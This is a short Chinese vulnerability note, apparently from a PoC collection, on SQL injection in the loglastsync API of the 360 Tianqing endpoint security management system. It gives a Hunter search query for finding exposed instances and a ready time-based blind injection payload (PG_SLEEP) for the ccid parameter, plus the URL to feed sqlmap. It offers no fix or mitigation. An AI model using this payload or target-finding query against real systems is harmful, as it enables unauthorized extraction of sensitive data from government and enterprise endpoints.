# 360天擎终端安全管理系统loglastsync存在SQL注入漏洞

# 一、漏洞简介
天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护;奇安信360天擎loglastsync存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。

# 二、影响版本
+ 360天擎终端安全管理系统

# 三、资产测绘
+ hunter`app.name=="天擎终端安全管理系统"`
+ 特征

![1699415110944-92dd0793-44ec-4b3a-8b0c-cddf0465a695.png](./img/4AK_mPZiZs3AUv9h/1699415110944-92dd0793-44ec-4b3a-8b0c-cddf0465a695-052369.png)

# 四、漏洞复现
```plain
/api/dp/loglastsync?ccid=1') AND 9421=(SELECT 9421 FROM PG_SLEEP(5)) AND ('crvL'='crvL
```

![1701002054713-6bc9dfc4-e8cb-4675-9bfe-76902dc2cc03.png](./img/4AK_mPZiZs3AUv9h/1701002054713-6bc9dfc4-e8cb-4675-9bfe-76902dc2cc03-612883.png)

sqlmap

```plain
/api/dp/loglastsync?ccid=1
```

![1701002087316-de0d5792-7b7c-4d76-b094-3b25d08c9ce5.png](./img/4AK_mPZiZs3AUv9h/1701002087316-de0d5792-7b7c-4d76-b094-3b25d08c9ce5-887312.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lcp8zauczcyost59>